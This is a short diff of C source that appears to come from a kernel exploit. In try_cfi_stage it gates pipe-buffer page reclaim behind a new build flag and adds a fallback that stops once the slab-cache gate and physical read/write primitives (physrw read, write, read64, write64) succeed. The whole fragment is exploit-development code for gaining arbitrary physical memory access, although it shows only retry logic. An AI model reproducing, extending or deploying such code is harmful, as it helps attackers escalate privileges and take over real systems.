@@ -528,7 +528,7 @@ int try_cfi_stage(void) {
     pipe_stage_attempts++;
     if (attempt != 0) {
       reset_pipe_attempt();
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+#if defined(APP_CZG3_CACHE_GATE_RECLAIM_RETRY) && APP_CZG3_CACHE_GATE_RECLAIM_RETRY
       pipebuf_page_base = prepare_pipe_buffer_page();
       pr_info("fresh physrw cache-gate retry page attempt=%d/%d base=%016zx\n",
               attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
@@ -549,6 +549,7 @@ int try_cfi_stage(void) {
       break;
     }
 
+#if defined(APP_CZG3_CACHE_GATE_RECLAIM_RETRY) && APP_CZG3_CACHE_GATE_RECLAIM_RETRY
     /* A fresh reclaim is safe only while the slab-cache gate is still the
      * failing boundary. Once a candidate pipe slab was accepted or any
      * physrw proof began, keep the existing fail-closed behavior. */
@@ -562,6 +563,12 @@ int try_cfi_stage(void) {
       pr_info("physrw cache gate miss; retrying with a fresh reclaim attempt=%d/%d\n",
               attempt + 2, PIPE_MAX_ATTEMPTS);
     }
+#else
+    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
+        physrw_read64_ok && physrw_write64_ok) {
+      break;
+    }
+#endif
   }
 
   if (!installed) {
